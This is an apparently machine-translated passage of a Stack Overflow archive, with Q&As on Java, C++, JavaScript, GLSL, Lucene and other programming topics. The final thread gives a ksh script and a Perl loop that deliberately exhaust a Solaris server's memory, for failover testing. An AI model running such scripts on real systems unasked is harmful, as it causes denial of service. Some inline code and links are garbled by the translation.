private static void recursiveWhiteToBlack(BufferedImage image, int width, int height){
    image.getRaster().setPixel(width,height, new int [] {0, 0, 0, 0, 0, 0});        
    int[][] neighbors = neighborsXY(width,height);

    for(int i = 0; i<neighbors.length; i++){
        int neighborX = neighbors[i][0];
        int neighborY = neighbors[i][1];
        int[] neighborColor = image.getRaster().getPixel(neighborX, neighborY, new int[] {0, 0, 0, 0, 0, 0});

        if(neighborColor[0] == 1){
            recursiveWhiteToBlack(image, neighborX, neighborY);
        }   
    }   
} 
```

调用它：

```
public static BufferedImage countObjects(BufferedImage image, BufferedImage original, ComponentPanel panel){
      BufferedImage target = copyImage(image);

      for(int width=1; width<image.getRaster().getWidth()-1; width++){ //Determine the dimensions for the width (x)         

          for(int height=1; height<image.getRaster().getHeight()-1; height++){ //Determine the dimensions for the height (y)

              int[] pixel = image.getRaster().getPixel(width, height, new int[] {0, 0, 0, 0, 0, 0});

              if(pixel[0] == 1){                      
                   none = recursiveWhitetoBlack(image, width, height);  //HOW TO CALL IT HERE!!!//

              }

      System.out.println("countObjects method called");
        return target;

    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:30:38.953

你这样称呼它：

```
if(pixel[0] == 1){                      
     recursiveWhitetoBlack(image, width, height);
} 
```

由于该方法没有返回类型，因此不需要变量赋值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:30:50.677

删除`none =`，因为您的方法返回 void（实际上意味着它不返回任何内容）

所以这应该看起来像：

```
if(pixel[0] == 1){                      
    recursiveWhitetoBlack(image, width, height);  

} 
```

另请注意，`none`它未定义为变量/成员，因此使用它是无效的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T18:31:32.383

这可能是个麻烦。我不确定你有一个真正的停止条件。当您遇到内存不足错误时，您会立即知道。

# delphi - 在另一个应用程序中控制主菜单

> ID：13806926
> 
> 赞同：1
> 
> 时间：2012-12-10T18:26:43.307
> 
> 标签：delphi, api, handles

我正在创建一个组件，它将访问其他应用程序并向它们填充信息。通常调用其他应用程序的表格，并将自动填写字段中的信息。填充类已准备就绪。我通过 windows Handles 进行了所有访问。它运行良好。

我现在需要做的是访问这个其他应用程序的主菜单并浏览菜单项。有了这个，它可以访问应用程序中的任何形式。

我做了几次测试，但没有成功。谁能给个提示？

现在感恩。

# javascript - 覆盖 js.erb 文件

> ID：13806928
> 
> 赞同：2
> 
> 时间：2012-12-10T18:27:05.710
> 
> 标签：javascript, ruby-on-rails, spree

我正在开发一个 spree 项目并尝试覆盖 spree_core 外部库中的 admin.js.erb 文件。这在简单地覆盖 js 文件时工作正常，但是当 js 文件具有扩展名时，它将忽略它/只编译它们。这是一个错误，rails 不知道如何覆盖扩展的 js 文件，或者只是我需要在某处设置配置以允许这样做？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-21T14:01:51.990

这可能是一个 Sprokets 错误，但我无法确定它。作为一种解决方法，您可以创建一个新文件名，如 overrides.js 并在 all.js 中要求它：

```
//= require admin/overrides 
```

admin/admin.js.erb 中的大部分内容都可以通过重新定义变量来覆盖。对于 jQuery 绑定，您可以取消绑定旧绑定并绑定新绑定。

# c++ - C++ 错误代码全局命名空间

> ID：13806930
> 
> 赞同：0
> 
> 时间：2012-12-10T18:27:14.743
> 
> 标签：c++, visual-studio-2010, visual-c++

我在 Visual Studio 2010 上遇到错误。我使用 c++ 并使用 opencv

错误 C2039：“退出”：不是“全局命名空间”的成员 错误 C2873：“退出”：符号不能在使用声明中使用

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:29:05.457

你应该

```
#include <stdlib.h> 
```

使用前`::exit()`。

# java - 如何防止struts2自动数据约定抛出异常

> ID：13806934
> 
> 赞同：-1
> 
> 时间：2012-12-10T18:27:25.850
> 
> 标签：java, struts2, web-frameworks

我是 Struts 的新手。我为视图提供了一个模型 courseBean 以捕获信息。

如果我以正确的形式输入正确的信息，它会完美运行。否则，如果我输入错误的格式，它会抛出异常。

说，我输入`abcd`了`courseBean.startDate`，它会抛出异常，因为`abcd`无法更改为`Date`格式。

有什么方法可以防止这些异常吗？或者我应该创建一个新的 Bean 类并将该类的所有属性设置为字符串？

```
 <!--Title-->
            <div class="control-group">
                <label class="control-label" for="inputEmail">Title:</label>
                <div class="controls">
                    <input type="text" name="courseBean.title" placeholder="Title" value="<s:property value="courseBean.title" />"/>
                </div>
            </div>

         <!--Start Date-->
        <div class="control-group">
            <label class="control-label" for="inputPassword">Start Date:</label>
            <div class="controls">
                <input type="text" readonly="readonly" name="courseBean.startdate" placeholder="Start Date" value="<s:property value="courseBean.startdate" />" />
            </div>
        </div> 
```

这个问题的重点是 Bean 输入的**自动数据格式约定**。

例如当我在映射到**courseBean.fee**`WARNING: Error setting expression 'courseBean.fee' with value '[Ljava.lang.String;@1b40489'`的文本字段中输入**“”**

 *** * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T12:10:48.433

首先，您必须验证用户在表单中输入的数据。这可以通过多种方式完成，使用[注释（验证注释部分）](http://struts.apache.org/2.0.14/docs/annotations.html)、使用[XML](http://struts.apache.org/2.2.3/docs/form-validation-using-xml.html)或使用您的操作中的简单`validate()`方法。如果官方文档不够，您可以在 Internet 上搜索大量有关如何使用 Struts2 验证数据的示例。

然后我想添加一些与你的jsp相关的东西。Struts2 有内置的标签，可以渲染很多东西，并帮助您与 jsps 交流动作。如果我们谈论的是表单，例如，我们`<s:form>`可以帮助您，例如，不要在 HTML 表单中对操作的 url 进行硬编码，或者`<s:textfield>`对呈现验证错误很有用。

如果问题是您想使用 Twitter Bootstrap 表示法来构建您的页面，那么有一个[插件](http://code.google.com/p/struts2-bootstrap/)可以呈现 HTML 以准备使用该 CSS 框架。

**编辑**

```
WARNING: Error setting expression 'courseBean.fee' 
with value '[Ljava.lang.String;@1b40489' 
```

您的方法的问题是您试图将 a 分配给`String []`一个可能不是 a 的字段`String []`（也许它是 a `Date`）。您必须获取`String`并解析它才能将其转换为`Date`对象。此外，如果您不知道如何使用 Struts2`<s:textfield>`以及如何`<s:form>`工作，您应该看看[这个教程](http://www.mkyong.com/struts2/struts-2-stextfield-textbox-example/)。它可能对你有帮助。**

# c# - LuaInterface - 如何从任何路径加载程序集？

> ID：13806936
> 
> 赞同：2
> 
> 时间：2012-12-10T18:27:28.877
> 
> 标签：c#, .net, lua, luainterface

我正在尝试使用 LuaInterface 加载 .net 程序集。如果我将程序集与我的可执行文件（以及我的 LuaInterface.dll 和 LuaNet.dll）放在同一个文件夹中，那么一切正常。我想将程序集移动到不同的文件夹中，但是当我尝试得到“用户代码中发生 .NET 异常”时。我努力了：

```
package.path = package.path .. "C:\\path\\to\\my\\assembly\\?.dll"
luanet.load_assembly("MyAssembly") 
```

和

```
luanet.load_assembly("C:\\path\\to\\my\\assembly\\MyAssembly") 
```

和

```
luanet.load_assembly("C:\\path\\to\\my\\assembly\\MyAssembly.dll") 
```

所有这些都返回 .NET 异常错误。有没有办法定义 LuaInterface 使用的路径？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-07T19:05:21.240

您的程序集由您的“托管”可执行文件加载，而不是由 Lua 环境本身真正加载。`luanet.load_assembly("MyAssembly")`只是让 Lua 环境可以访问程序集。例如（C#）：

```
using MyAssembly; //you can't compile unless MyAssembly is available

namespace LuaRunner
{
    class LuaRunner
    {        
        void DoLua()
        {
            using (LuaInterface.Lua lua = new LuaInterface.Lua())
            {
                lua.DoString("luanet.load_assembly('MyAssembly')");
                //... do what you want within Lua with MyAssembly
            }
        }
    }
} 
```

您正在运行的程序是 Lua 在其中运行的“宿主”，因此实际加载的是您正在运行的程序`MyAssembly`。您的可执行文件需要对 MyAssembly.dll 的引用（并且需要能够在运行时在通常的位置找到它）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-12T13:40:39.623

要搜索其他程序集，请设置`package.cpath`变量。例如：

```
package.cpath = DATA_DIR .. "\\clibs\\?.dll;" .. package.cpath 
```

从[Lua 5.1 文档](http://www.lua.org/manual/5.1/manual.html)：

要求（模组名）

> 首先需要查询 package.preload[modname]。如果它有一个值，这个值（应该是一个函数）就是加载器。否则需要使用存储在 package.path 中的路径搜索 Lua 加载器。如果这也失败了，它会使用存储在 package.cpath 中的路径来搜索 C 加载器。

包.cpath

> require 用于搜索 C 加载器的路径。
> 
> Lua 初始化 C 路径 package.cpath 的方式与初始化 Lua 路径 package.path 的方式相同，使用环境变量 LUA_CPATH 或 luaconf.h 中定义的默认路径。

# apache-flex - flex 4 默认通道集被忽略

> ID：13806947
> 
> 赞同：1
> 
> 时间：2012-12-10T18:28:25.133
> 
> 标签：apache-flex, flex4

当您开始一个新项目时，默认配置是对所有目的地使用 my-amf 通道，如下所示：

```
<default-channels>
    <channel ref="my-amf"/>
</default-channels> 
```

但是突然间，有些事情搞砸了，我必须为项目中的每个远程对象指定一个端点，因为如果我不这样做，除了一个之外的每个远程对象（idk 为什么这样做......）都会失败并显示错误消息：

无法通过通道“my-rtmp”访问目标“名称”

有人告诉我，我的项目名称与 flex 服务器属性中的上下文根不同可能是原因，但事实并非如此。

有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T20:23:27.290

好吧，这有点令人失望，我刚刚发现，构建路径上的一些路由，甚至 flex 编译器参数都搞砸了......

这应该是我看的第一个地方，但是匆忙中，我没有想清楚，现在一切都很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T21:35:50.513

您应该能够在 Web 配置中找到目标的默认值。将其更改为您的 CF 服务器设置为使用的任何内容。

# visual-studio-2010 - 为 WCF 托管打开 svc 文件

> ID：13806953
> 
> 赞同：3
> 
> 时间：2012-12-10T18:28:51.140
> 
> 标签：visual-studio-2010, wcf, c#-4.0

我想打开一个 svc 文件来查看它的代码。但我总是自动打开 svc.cs 文件。为什么？

我使用 visula studio 2010，c# 4.0。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T18:31:12.243

那么这`.cs`是你的代码文件......但在Visual Studio中，右键单击`.svc`文件 - >“查看标记”。除非您正在创建服务工厂或更改 Codebehind 文件，否则我认为您无能为力。

# asp.net-mvc - PartialView 的控制器

> ID：13806955
> 
> 赞同：1
> 
> 时间：2012-12-10T18:29:07.460
> 
> 标签：asp.net-mvc, asp.net-mvc-3

我正在 MVC 3 中创建一个新的局部视图，因为我的应用程序需要此功能。是否可以为我的局部视图设置一个单独的控制器

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:40:29.797

是的你可以。创建控制器（如果您只需要将控制器用于局部视图，请考虑禁用非子操作调用）：

```
public class FooController : Controller
{
    [ChildActionOnly]
    public PartialViewResult Bar()
    {
        var model = new BarModel();
        return PartialView("_Bar", model);
    }
} 
```

并使用它

```
@Html.RenderAction("Bar", "Foo") 
```

# perl - Jenkins 错误：运行 ANT 调用时处理泄漏归档描述

> ID：13806957
> 
> 赞同：0
> 
> 时间：2012-12-10T18:29:20.283
> 
> 标签：perl, ant, jenkins

每当我尝试从 Jenkins 中的 Perl 脚本调用我的 ANT 脚本时，我目前都会收到“进程泄漏文件描述”错误。这项工作实际上是正确完成的，但它在 Jenkins 中出错了。Perl 脚本调用类似于

```
exe("CALL ant -buildfile C:\\build.xml"); 
```

我曾尝试在其他地方搜索此 Jenkins 问题，但我尝试过的所有方法似乎都不起作用。有人有什么我可以尝试的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T19:14:38.343

您不应该从 perl 脚本调用 ant。Jenkins 有一个用于 ant 构建的[插件。](https://wiki.jenkins-ci.org/display/JENKINS/Ant+Plugin)

如果您的脚本生成 build.xml，您可以在项目配置中设置两个操作。第一个使用脚本生成构建文件，第二个在其上执行 ant。

# javascript - 解释 javascript 中的奇怪行为

> ID：13806958
> 
> 赞同：3
> 
> 时间：2012-12-10T18:29:31.950
> 
> 标签：javascript

我在推特上看到了这个，我也无法解释。`onload`以以下两种方式定义函数有效：

# 1）[JSFiddle](http://jsfiddle.net/6rq9k/)

```
<html>
    <head>
        <script>
            onload = function(){
                alert('this works');
            };
        </script>
</head>
<body>
</body>
</html>​ 
```

# 2）[JSFiddle](http://jsfiddle.net/6rq9k/1/)

```
<html>
    <head>
        <script>
            window.onload = function(){
                alert('this works');
            };
        </script>
</head>
<body>
</body>
</html>​ 
```

但是当像下面这样定义时，即使它被分配给它也不起作用`window.onload`

# 3）[JSFiddle](http://jsfiddle.net/6rq9k/2/)

```
<html>
    <head>
        <script>
            function onload(){
                alert('this doesnt work');
            };
            alert(window.onload); // this shows the definition of above function
        </script>
</head>
<body>
</body>
</html>​ 
```

这里发生了什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-10T18:31:58.930

前两个示例将函数分配给`window.onload`属性（`window.`在第一个示例中隐含）。该`onload`属性实际上属于（方便地称为）的*原型*。`window``Window`

第三个变体声明了一个新的同名*本地函数，并且该函数隐藏了原型中的属性。*这意味着，当你请求时`window.onload`，引擎首先找到本地版本，并放弃查找原型链。`alert(window.onload);`提醒您的函数源也是如此。但是，要使事件处理程序工作，必须将其分配给原型对象的`onload`属性。

[但是，发生了一些奇怪](http://jsfiddle.net/ssBt9/)的事情：当您尝试分配从`prototype`. [://jsfiddle.net/ssBt9/](http://jsfiddle.net/ssBt9/)）。但`window`行为不同（[http://jsfiddle.net/asHP7/](http://jsfiddle.net/asHP7/)），行为甚至可能因浏览器而异。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-10T18:44:36.357

那是因为在你的脚本执行之前`onload`已经声明了。`null`

这类似于该代码：

```
var v=null;
function v(){
    console.log('hi');
}​​​​
console.log(v); // alerts null 
```

这与这个不同：

```
function v(){
    console.log('hi');
}​​​​
console.log(v); // alerts the function 
```

当你像这样声明一个函数时，声明和赋值在逻辑上被提升到作用域的“开始”，因此在函数被赋予值*之后*赋值不会真正发生。`onload``null`

这就是为什么它不同于

```
window.onload=... 
```

这不是一个声明，而只是一个不能提升的赋值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T18:33:29.237

在前两种情况下，您正在定义一个名为 onload 的窗口成员。在第三种情况下，您只定义一个函数，但不是当前窗口的成员。

# python - 自动修复python缩进错误

> ID：13806961
> 
> 赞同：2
> 
> 时间：2012-12-10T18:29:42.610
> 
> 标签：python, eclipse, pydev

> **可能重复：**
> [HOWTO：修复 Python 缩进](https://stackoverflow.com/questions/1024435/howto-fix-python-indentation)

我有一些从旧代码复制粘贴的代码，所以现在缩进完全错误，编译器会出错。

有没有办法自动修复缩进（不仅仅是用空格交换制表符）？`Ctrl`我在 Eclipse 中使用++尝试了 pyDev 2.7（它声称具有自动格式化）`Shift`，`F`但它没有改变任何东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:36:47.217

使用缩进

[http://pypi.python.org/pypi/Reindent/0.1.0](http://pypi.python.org/pypi/Reindent/0.1.0)

```
pip install reindent
reindent <file> 
```

你也可以看看 PythonTiddy

# java - 处理lucene中域对象的一对多关系

> ID：13806968
> 
> 赞同：1
> 
> 时间：2012-12-10T18:29:56.393
> 
> 标签：java, lucene

我有一个带有以下数据的对象

```
String key  
String name  
List<String> address 
```

我将如何为上述对象创建一个 lucene 文档我必须搜索名称和地址，我已经创建了名称索引，但我也想
为 ex 创建地址索引

```
key:1 name:sam address:lane no 1 behind la gardens  
key:1 name:sam address:near abc cross main road 
```

我应该如何创建和存储索引我必须存储两个具有通用名称和密钥的文档

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T21:34:15.017

If I understand correctly, you want an arbitrary number of related addresses, retrievable separately, but searchable simply as:

```
address:"my address" 
```

I would recommend storing addresses named whatever you like (I will use 'address1' and 'address2' here), and accumulating their text into one big old 'address' field. Something like:

```
doc.add(new Field("key", "1", Field.Store.YES, Field.Index.ANALYZED));
doc.add(new Field("name", "sam", Field.Store.YES, Field.Index.ANALYZED));
doc.add(new Field("address", "lane no 1 behind la gardens near abc cross main road", Field.Store.NO, Field.Index.ANALYZED));
//Note, that you can add multiple fields with the same name, and it will effectively be merged together, as:
doc.add(new Field("address", "more address information for searching", Field.Store.NO, Field.Index.ANALYZED));
doc.add(new Field("address1", "lane no 1 behind la gardens", Field.Store.YES, Field.Index.NO));
doc.add(new Field("address2", "near abc cross main road", Field.Store.YES, Field.Index.NO)); 
```

Note that address is passed `Field.Store.NO` and `Field.Index.ANALYZED`, while address1 and address2 are passed `Field.Store.YES` and `Field.Index.NO`. So you search on 'address', but never on 'address1' or 'address2', and you retrieve 'address1' and 'address2' from found documents, but never 'address'

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:39:33.117

```
Document temp = new Document();
temp.add(new Field("name", "sam", Field.Store.YES, Field.Index.ANALYZED));
temp.add(new Field("address", "lane no 1 behind la gardens", Field.Store.YES,
                   Field.Index.ANALYZED));
indexWriter.addDocument(temp); 
```

搜索喜欢

```
name:sam address:gardens 
```

将导致匹配上述文档

# c++ - 无符号整数向量的差异，解释为有符号并转换为未正确呈现的浮点向量

> ID：13806978
> 
> 赞同：2
> 
> 时间：2012-12-10T18:30:39.133
> 
> 标签：c++, opengl, glsl, runtime-error, eigen

如果我在我的 c++ 代码中取两个 uint 向量的差异，转换为 int，转换为 float，然后传递给 GLSL，它会呈现良好。但是当我尝试让 GLSL 发挥作用并进行投射时，它会以几乎均匀的阴影覆盖屏幕，就好像我要绘制的正方形真的被放大了一样。是的，我真的很想在 GLSL 中这样做，如果只是看看如何。此外，我的矩阵和向量在 Eigen 对象中，尽管我不确定它是否重要。

![在此处输入图像描述](../Images/d8a20fcce190c968bf8fa0402df341f1.png)![在此处输入图像描述](../Images/3759ccd20139231787cd133f490a37b4.png)

无论如何，为了确保清楚，我的 projviewMatrix （在两种情况下都相同）在给定应该是相同的浮点向量相乘时工作得非常好。所以我很确定问题出在 GLSL 中的 uint 向量减法上。我在 c++ 中执行了与在着色器中完全相同的操作（uint 向量减法、转换为 int 和转换为浮点数），但一个有效，一个无效。

这是我目前正在尝试的顶点着色器。我尝试将向量视为有符号整数并进行减法，因为运算应该相同......我认为。行为没有变化。

```
#version 150 core

uniform mat4 projviewMatrix;
uniform ivec3 camera;

in ivec3 in_Position;
in vec3 in_Color;

out vec3 pass_Color;

void main()
{
 gl_Position = projviewMatrix * vec4(in_Position - camera, 1.0);
 pass_Color = in_Color;
} 
```

我试过传递`in_Position`和`camera`作为 uvec3s，然后做`ivec4(in_Position - camera, 1)`和其他各种愚蠢的重新排列无济于事。还尝试重命名`camera`为`in_Camera`. 我承认，那是绝望的。

我的制服路过的东西。当我传入工作浮点向量时，我只需注释掉 2 条相机线。

```
GLint viewLoc = glGetUniformLocation(shader.id(), "projviewMatrix"); //this is an ortho projection with 1/2 scaling, no rotation or translation
GLint cameraLoc = glGetUniformLocation(shader.id(), "camera");

glUniformMatrix4fv(viewLoc, 1, GL_FALSE, projview.data());
glUniform3uiv(cameraLoc, 1, camera.pos.data()); 
```

这就是我将 VBO 绑定到 VAO 的方式。

```
glBindBuffer(GL_ARRAY_BUFFER, vboID[0]);
glBufferData(GL_ARRAY_BUFFER, 12 * sizeof(GLint), 0, GL_STREAM_DRAW);

glVertexAttribPointer(0, 3, GL_INT, false, 0, 0); 
```

这是有效的浮点向量输入 GLSL。 `in_Position`是`in_Position`从上面减去`camera`并转换为 int 然后在我的 c++ 代码中浮动。

```
#version 150 core

uniform mat4 projviewMatrix;

in vec3 in_Position;
in vec3 in_Color;

out vec3 pass_Color;

void main()
{
 gl_Position = projviewMatrix * vec4(in_Position, 1.0);
 pass_Color = in_Color;
} 
```

我的 projviewMatrix 只做两件事：正射投影和 1/2 缩放。没有平移或旋转，或其他任何东西。它的正交部分是使用这些参数生成的，宽度/高度是窗口的宽度/高度。

```
proj = orthoProj(-width, width, -height, height, -4, 4); 
```

**编辑：**
**应阿尔夫的要求：**

这发生在我绑定我的制服后：

```
glBindBuffer(GL_ARRAY_BUFFER, vboID[0]);
int* buffer = (int*) glMapBuffer(GL_ARRAY_BUFFER, GL_WRITE_ONLY);

static const int width = 1000;
TestObject& test = game.test;

buffer[0] = test.pos[0] - width;
buffer[1] = test.pos[1] - width;
buffer[2] = 0; 
```

`buffer`我不断地像这样手动 填写。`test.pos`是正方形的中心，当前等于`camera.pos`xy 坐标 (1 << 31, 1 << 31)。在我在 c++ 中进行减法的情况下，缓冲区中的每个顶点之后都有 3 行这样的行：

```
buffer[0] -= camera.pos[0];
buffer[1] -= camera.pos[1];
buffer[2] -= camera.pos[2]; 
```

无论哪种方式，我都将数据作为整数传递。除了相机统一绑定和 GLSL 代码差异之外，上面的块（发生在每个`buffer`顶点上）是我的“GLSL 减法”和“C++ 减法”内容之间的唯一区别。

`test.pos`并且`camera.pos`都是`Eigen::Vector3ui`对象，所以 uint vector 3s。

**编辑2：**

我认为还值得注意的是，我有调试输出打印着色器中的任何错误，但没有。此外，如果我将`in_Position`和更改`camera`为`vec3`，结果是与其他任何东西相同的蓝绿色阴影。

如果我在顶点着色器中创建自己的 ivec3 并使用它`camera`代替x 和 y 轴。我的顶点着色器中没有任何类型的杂耍或中间变量似乎能够解决这个问题。

**编辑3：**

使用`glVertexAttribIPointer()`将数据放入`in_Position`已解决部分问题，这肯定是 OpenGL 在我的 GLSL 代码执行之前进行了额外的强制转换以浮动。但是，`camera`向量仍然以同样的方式出现错误，我不知道除了我目前使用的`glUniform3uiv`. 我尝试使用`glUniform3ui`并输入它的 3 个值，但这也没有用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T22:35:33.897

有2个问题。

1.  应该设置指向整数属性的指针，`glVertexAttribIPointer()`因为这`glVertexAttribPointer()`会导致 openGL 对浮点数执行一些额外的转换。
2.  `ivec3`制服的设置`glUniform3uiv()`也可能导致意外的演员表。正确的解决方案是使用 unsinged uniform 并在着色器中执行投射。

# c++ - 使用 Struct 的动态向量

> ID：13806983
> 
> 赞同：1
> 
> 时间：2012-12-10T18:30:57.977
> 
> 标签：c++, dynamic, vector, struct

我有这个结构：

```
struct Node {
  int number;
  Node *next;
}; 
```

和这个类来插入元素并显示向量：

```
// Classe DynamicVector :
//  e' la classe che consente di inserire elementi
//  e visualizzare il vettore di strutture
class DynamicVector
{

  public:
    DynamicVector();
    void InsertNumber(int number);
    void ShowVector();

  protected:
    Node *p;

}; 
```

这是实现：

```
DynamicVector::DynamicVector() {
  this->p = NULL;
}

void DynamicVector::InsertNumber(int number) {
  Node *temporary = new Node;

  // Possiamo avere due possibili casi:
  //  non e' stato ancora inserito nessun elemento
  // ...
  if (this->p == NULL) {
    temporary->number = number;
    temporary->next   = NULL;

    this->p = temporary;
    // ...
    //  oppure dobbiamo aggiungerne uno alla fine
    //  In questo caso meglio dire, lo "accodiamo"
  } else {
    // Sfogliamo le strutture fino a giungere
    // all' ultima creata
    while (this->p->next != NULL) {
      this->p = this->p->next;
    }

    temporary->number = number;
    temporary->next   = NULL;

    // In questo passaggio copiamo la struttura
    // temporanea "temporary" nell' ultima struttura "p"
    this->p->next = temporary;
  }
}

void DynamicVector::ShowVector() {
  while (this->p != NULL) {
    std::cout << this->p->number << std::endl;
    this->p = this->p->next;
  }
} 
```

在主函数中我写了这个：

```
#include <iostream>
#include <conio.h>

#include "dynamic_vector.h"

int main() {
  DynamicVector *vector = new DynamicVector();

  vector->InsertNumber(5);
  vector->InsertNumber(3);
  vector->InsertNumber(6);
  vector->InsertNumber(22);
  vector->ShowVector();

  delete vector;

  getch();
  return 0;
} 
```

我不知道为什么，但它只显示最后两个数字。有人知道为什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:43:07.483

它只显示最后两个数字，因为当您插入新数字时，您会将头部移动到下一个节点。您有两个选项可以打印整个矢量。

```
if (this->p == NULL) {
  temporary->number = number;
  temporary->next   = NULL;

  this->p = temporary;
  // ...
  //  oppure dobbiamo aggiungerne uno alla fine
  //  In questo caso meglio dire, lo "accodiamo"
} else {
  // Sfogliamo le strutture fino a giungere
  // all' ultima creata
  Node* temp2 = this->p;
  while (temp2->next != NULL) {
    temp2 = temp2->next;
  }

  temporary->number = number;
  temporary->next   = NULL;

  // In questo passaggio copiamo la struttura
  // temporanea "temporary" nell' ultima struttura "p"
  temp2->next = temporary;
} 
```

或在 main() 中，存储向量的第一个节点的位置，并将其用于打印

```
DynamicVector *vector = new DynamicVector();
DynamicVector *vector2 = vector;
...
vector2->ShowVector(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:42:51.093

```
while (this->p->next != NULL) {
   this->p = this->p->next;
} 
```

在此代码中，您将跳过所有现有节点，并且该节点会丢失它们。即当 p 不为 NULL 时调用它，然后将 p 重置为 NULL。该代码没有意义，它等于 p = NULL。

要么改变这个，要么做

```
vector->InsertNumber(5)->InsertNumber(3)->InsertNumber(6)->InsertNumber(22); 
```

（您必须从 InsertNumber 返回“this”）；

或者你可以两者都做。

# java - 将 ImageView 设置为屏幕高度的一半和整个屏幕宽度

> ID：13806984
> 
> 赞同：-3
> 
> 时间：2012-12-10T18:30:58.087
> 
> 标签：java, android, xml, image, resize

它是怎样的：http: [//i49.tinypic.com/352lxdt.png](http://i49.tinypic.com/352lxdt.png) 我想要的：http: [//i45.tinypic.com/bahc1.png](http://i45.tinypic.com/bahc1.png)

如何通过 XML 和代码做到这一点。？我正在使用相对布局。还想要 API 级别 8（来自 android 2.3+）.. 所以不能使用 setWidth()、setHeight() 帮助..？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T19:31:21.513

尝试使用具有权重总和的 LinearLayout 包装 RelativeLayout，并为 RelativeLayout 赋予所需的权重。例子：

```
<LinearLayout
android:layout_width="match_parent"
android:layout_height="match_parent"
android:orientation="vertical"
android:weightSum="2" >

<LinearLayout
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:layout_weight="1" >

    <RelativeLayout
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        tools:context=".MainActivity" >

        <ImageView
            android:id="@+id/imageView1"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:layout_alignParentLeft="true"
            android:layout_alignParentRight="true"
            android:layout_alignParentTop="true"
            android:background="@android:color/black"
            android:scaleType="fitXY" />
    </RelativeLayout>
</LinearLayout>

<LinearLayout
    android:layout_width="match_parent"
    android:layout_height="match_parent" >
</LinearLayout> 
```

# perl - 使用 Solaris 中的所有系统内存

> ID：13806990
> 
> 赞同：2
> 
> 时间：2012-12-10T18:31:20.167
> 
> 标签：perl, shell, memory, solaris

我正在做服务器测试，并故意尝试使用所有内存来使 Solaris 服务器崩溃。服务器的 ulimit 为 15 GB（数百 GB 的总系统/交换内存）。是否有使用 shell/Perl 脚本执行此操作的直接方法？（*编辑*：这是在一个强化/安全的环境中，所以我可以访问的唯一工具是 Perl [当然还有 shell]）。

背景：实际测试的是将基本进程故障转移到另一台服务器。最近我们一直有一些进程“失控”并消耗所有系统资源，从而导致服务器崩溃（单独的问题）。我正在尝试创建一个简单的可重复场景来测试对这种情况的响应。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T00:53:56.737

假设 /tmp 安装在 tmpfs 上并且您没有在其上设置配额（即默认配置），这是一种使用 shell 脚本使用几乎所有内存的方法（请注意，您的系统将几乎无法使用当你的 RAM 用完后）：

```
#!/bin/ksh

function trapped
{
  echo "Eatswap done"
  rm -f /tmp/eatSwap.*
  exit
}

function showFreeSpace
{
  freeSpace=$(swap -s | sed -e 's/.*, //' -e 's/k.*//')
  echo free space = $freeSpace KB
}

trap trapped 2
counter=0
i=0
showFreeSpace
fs=$freeSpace
while [ $i -lt 10 ]; do
  dd if=/dev/zero of=/tmp/eatSwap.$i bs=$(($fs/10)) count=1024 2>/dev/null || trapped
  sleep 2
  showFreeSpace
  i=$((i+1))
done
echo "done"
sleep 2
rm -f /tmp/eatSwap.* 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T00:50:58.070

在 Perl 中，您可以通过字符串和重复运算符非常精确地分配固定数量的内存`x`。由于 Perl 以两字节表示形式存储字符，因此以下函数将返回一个指向`$x`MB 内存的标量：

```
sub allocate_MB {
   my ($x) = @_;
   "0" x ( $x / 2 * 2**(20))
} 
```

（但是，仅在 Ubuntu 上使用 perl 5.12 进行了测试）

当 Perl 无法分配更多内存时，它会死掉并显示一条[消息告诉你 so](http://perldoc.perl.org/perldiag.html#Out-of-memory!)。

一个简单的`my @stor; push @stor, allocate_MB(200) while 1`应该很快达到任何限制。